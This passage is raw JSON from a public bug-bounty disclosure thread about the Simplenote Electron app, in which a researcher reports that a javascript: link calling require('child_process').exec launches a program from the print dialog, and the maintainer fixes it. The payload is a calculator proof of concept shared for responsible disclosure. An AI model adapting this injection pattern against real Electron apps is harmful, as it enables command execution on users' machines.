class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-14T16:10:52.066Z","updated_at":"2018-06-14T16:10:52.066Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2884112,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-14T16:11:08.070Z","updated_at":"2018-06-14T16:11:08.070Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2886149,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @roundhill ,\n\nThe fix in Simplenote **1.1.4** is good, but there is still a little bug that allows to execute code. I have attached a proof-of-concept video. \n\n### Step to reproduce\n\n* You paste this code in Simplenote 1.1.4 with **enabled** Markdown\n\n```\n\u003ca href=\"javascript:require('child_process').exec('/usr/bin/gnome-calculator',function(){});\"\u003eCLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME \u003c/a\u003e\n```\n* Now you **enable** the Preview\n* Go to Print and, when the window to print appears, you click on *CLICK ME*\n* Gnome Calculator runs\n\nSo, maybe you want to fix this little bug too. However, it is difficult to make a RCE in this way.\n\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/roundhill\"\u003e@roundhill\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThe fix in Simplenote \u003cstrong\u003e1.1.4\u003c/strong\u003e is good, but there is still a little bug that allows to execute code. I have attached a proof-of-concept video. \u003c/p\u003e\n\n\u003ch3 id=\"step-to-reproduce\"\u003eStep to reproduce\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eYou paste this code in Simplenote 1.1.4 with \u003cstrong\u003eenabled\u003c/strong\u003e Markdown\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a href=\u0026quot;javascript:require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;/usr/bin/gnome-calculator\u0026#39;,function(){});\u0026quot;\u0026gt;CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME \u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eNow you \u003cstrong\u003eenable\u003c/strong\u003e the Preview\u003c/li\u003e\n\u003cli\u003eGo to Print and, when the window to print appears, you click on \u003cem\u003eCLICK ME\u003c/em\u003e\n\u003c/li\u003e\n\u003cli\u003eGnome Calculator runs\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSo, maybe you want to fix this little bug too. However, it is difficult to make a RCE in this way.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-14T20:41:36.535Z","updated_at":"2018-06-14T20:56:06.628Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":309009,"filename":"simplenote_rce_2.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/309/009/ac199962f8b5f5045a368af1ef7e4712e2f7e2e1/simplenote_rce_2.mp4?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_2.mp4%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_2.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054231Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=8ed900ebc7941034f9d64d12de96aa8dde299144d78ea9a908622711e7cd714d"}],"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2886822,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tried to look at the source code, but I do not understand where the bug is. In [your fix](https://github.com/Automattic/simplenote-electron/commit/35c816eba4637282e0d0adddd696b3c3b142c69f) I read (*line 232-233*)\n ```\n+              dangerouslySetInnerHTML={{\n+                __html: renderNoteToHtml(content),\n ```\n\n**renderNoteToHtml** is in these two files: [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/render-note-to-html.js) and [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/sanitize-html.js).\n\nIn **sanitize-html.js** there is the code:\n ```\n      // only valid http(s) URLs are allowed\n      if (('href' === name || 'src' === name) \u0026\u0026 validUrl.isWebUri(value)) {\n        return false;\n      }\n ```\nSo **href=\"javascript:alert(1)\"** should not work. Indeed in the Preview it doesn't work, but it works in the print moment. Another strange thing: **href=\"javascript:alert(1)\"** runs, but **href=\"javascript:write(1)\"** does not seem to run.\n\nI'm curious to understand the problem in the code.\nThank you.","markdown_message":"\u003cp\u003eI tried to look at the source code, but I do not understand where the bug is. In \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fcommit%2F35c816eba4637282e0d0adddd696b3c3b142c69f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eyour fix\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e I read (\u003cem\u003eline 232-233\u003c/em\u003e)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e+              dangerouslySetInnerHTML={{\n+                __html: renderNoteToHtml(content),\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003erenderNoteToHtml\u003c/strong\u003e is in these two files: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fblob%2Fmaster%2Flib%2Futils%2Frender-note-to-html.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fblob%2Fmaster%2Flib%2Futils%2Fsanitize-html.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eIn \u003cstrong\u003esanitize-html.js\u003c/strong\u003e there is the code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e      // only valid http(s) URLs are allowed\n      if ((\u0026#39;href\u0026#39; === name || \u0026#39;src\u0026#39; === name) \u0026amp;\u0026amp; validUrl.isWebUri(value)) {\n        return false;\n      }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo \u003cstrong\u003ehref=\u0026quot;javascript:alert(1)\u0026quot;\u003c/strong\u003e should not work. Indeed in the Preview it doesn\u0026#39;t work, but it works in the print moment. Another strange thing: \u003cstrong\u003ehref=\u0026quot;javascript:alert(1)\u0026quot;\u003c/strong\u003e runs, but \u003cstrong\u003ehref=\u0026quot;javascript:write(1)\u0026quot;\u003c/strong\u003e does not seem to run.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m curious to understand the problem in the code.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-15T01:31:54.410Z","updated_at":"2018-06-15T01:31:54.410Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2900985,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @roundhill , \n\nDo you confirm the bug?\n\nBest regards","markdown_message":"\u003cp\u003eHi \u003ca href=\"/roundhill\"\u003e@roundhill\u003c/a\u003e , \u003c/p\u003e\n\n\u003cp\u003eDo you confirm the bug?\u003c/p\u003e\n\n\u003cp\u003eBest regards\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-18T11:45:32.368Z","updated_at":"2018-06-18T11:45:32.368Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2902840,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Taking a look now, will get back to you soon.","markdown_message":"\u003cp\u003eTaking a look now, will get back to you soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-18T20:07:09.963Z","updated_at":"2018-06-18T20:07:09.963Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2908291,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've created a fix here, if you are curious about the details: https://github.com/Automattic/simplenote-electron/pull/771","markdown_message":"\u003cp\u003eI\u0026#39;ve created a fix here, if you are curious about the details: \u003ca title=\"https://github.com/Automattic/simplenote-electron/pull/771\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F771\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Automattic/simplenote-electron/pull/771\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-19T18:05:01.499Z","updated_at":"2018-06-19T18:05:01.499Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2911516,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good, thanks @roundhill :)\n\nWhen you want you can set the report like \"Resolved\"!","markdown_message":"\u003cp\u003eGood, thanks \u003ca href=\"/roundhill\"\u003e@roundhill\u003c/a\u003e :)\u003c/p\u003e\n\n\u003cp\u003eWhen you want you can set the report like \u0026quot;Resolved\u0026quot;!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-20T11:43:57.700Z","updated_at":"2018-06-20T11:44:36.671Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2932597,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-25T20:09:41.671Z","updated_at":"2018-06-25T20:09:41.671Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"luigigubello","url":"/luigigubello"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2932599,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-25T20:10:27.188Z","updated_at":"2018-06-25T20:10:27.188Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"luigigubello","url":"/luigigubello"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2934312,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you :) Can we do public disclosure?\n","markdown_message":"\u003cp\u003eThank you :) Can we do public disclosure?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-26T08:26:03.270Z","updated_at":"2018-06-26T08:26:03.270Z","first_to_agree":true,"actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3099974,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-26T08:26:07.167Z","updated_at":"2018-07-26T08:26:07.167Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}